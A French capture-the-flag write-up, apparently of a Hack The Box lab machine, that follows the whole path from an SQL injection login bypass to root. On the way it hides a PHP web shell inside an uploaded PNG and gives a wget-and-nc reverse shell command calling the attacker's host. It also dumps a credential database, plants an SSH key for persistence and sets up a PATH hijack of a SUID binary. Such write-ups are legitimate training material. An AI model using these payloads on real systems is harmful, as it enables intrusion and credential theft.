Site Web

Pour le site web il s’agit d’un portfolio d’images. Une page de login est accessible à cette adresse : http://10.10.10.185/login.php

Contournement de l’authetification très simple grace à une injection SQL

  • login : admin' OR 1 = 1;
  • pass : admin' OR 1 = 1;

Nous avons maintenant accès à la page upload.php qui nous permet d’upload une image dans la galerie. On va tester ça avec une simple image.

Notre image ce trouve à l’adresse suivante : http://10.10.10.185/images/uploads/luffy.png

Maintenant, essayons en changeant l’extension par luffy.php.png.

Il est donc possible d’upload des image en php.png sans contrainte et ensuite de les afficher, maintenant essayons en y ajoutant un webshell php.

https://github.com/artyuum/Simple-PHP-Web-Shell/blob/master/index.php

BON ca ne fonctionne pas très bien avec seulement du PHP.

Je pense qu’il y a une lecture du fichier et si un caractère du style “<” se trouve dans le fichier, il y a une exeption.

J’ai pu faire un test avec un simple fichier hello.php.png qui contient seulement <H1>Hello</H1> celui-ci retourne la même erreur.

Et si je mettais mon code PHP à la fin de mon image ?

Effectivement, ca fonctionne en laissant l’image comme elle est et en ajoutant notre webshell à la fin.

Road to USER

Bon, je vais essayé d’avoir un meilleur shell en utilisant nc.

J’ai fait une copie du binaire dans un dossier puis j’ai ensuite démarrer un serveur python pour pouvoir y accéder à distance.

wget http://10.10.14.7/nc -P /tmp/ && chmod +x /tmp/nc && /tmp/./nc 10.10.14.7 8888 -e /bin/bash

Malheureusement cette commande ne fonctionne pas dans le webshell, je vais essayé de la faire executer dans une image comme le webshell.

J’ai refais un luffy.php.png avec à la fin <?php system("wget http://10.10.14.7:8000/nc && chmod +x nc && ./nc 10.10.14.7 8888 -e /bin/bash"); ?>

Bien !

On fait spawn un /bin/bash avec python3 -c 'import pty; pty.spawn("/bin/bash")'

On peut voir qu’une base de donnée mysql est utilisée, mais que le binaire mysql n’existe pas.

En faisant un ls /usr/bin/mysql* on peut voir d’autre binaire mysql.

Un petit tuto ICI pour utiliser mysqldump.

Je me suis intéréssé à ce binaire car je cherche ç faire un dump de la base de donnée avec les creds que j’ai trouvé dans db.php5.

Avec la commande : mysqldump -u theseus -p Magic > /tmp/base.sql

On peut récupérer la base de donnée base.sql dans /tmp.

 /*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');

Nous avoila avec un autre mot de passe, on va tout de suite l’utiliser avec le compte theseus !

Et nous voila USER !

J’en ai profité pour mettre ma clé publique SSH dans le fichier .ssh/autorized_keys afin d’avoir un accés SSH à tout moment.

Road to ROOT

On va refaire une énumération mais cette fois en utilisant LinEnum

A première vue, rien ne me saute au yeux dans le rapport linenum.

SUID

Après avoir quelques heures d’énumération, je décide de regarder les binaire exploitable avec la commande find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;

-rwsr-xr-x 1 root root 26696 Jan  8  2020 /bin/umount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
-rwsr-xr-x 1 root root 43088 Jan  8  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping

Je tombe sur le même résultat que linenum mais cette fois-ci , ca me saute au yeux ! Le binaire /bin/sysinfo appartient aussi au groupe users mais est executé par le compte root !

De plus ce binaire peut-être executé par notre compte user !

CVE ?

On regarde les CVE sur le binaire sysinfo.

Je tombe sur cette CVE :

  • https://www.cvedetails.com/cve/CVE-2017-6516/
  • https://www.exploit-db.com/exploits/44150

Mais après quelques tentatives, j’ai abandonné l’idée d’utiliser une CVE.

PATH exploit

En regardant de plus près, le binaire sysinfo executer une commande familière.

L’output ressemble beaucoup à la commande free.

L’idée serait de faire executer une fausse commande free à sysinfo afin de faire executer une commande au compte root.

Création de l’exploit

Modification du PATH Il faut mettre le /tmp au début du PATH comme ça c’est ici que le système va cherche des binaires en premier.

BINGO nous voila avec un accès ROOT !
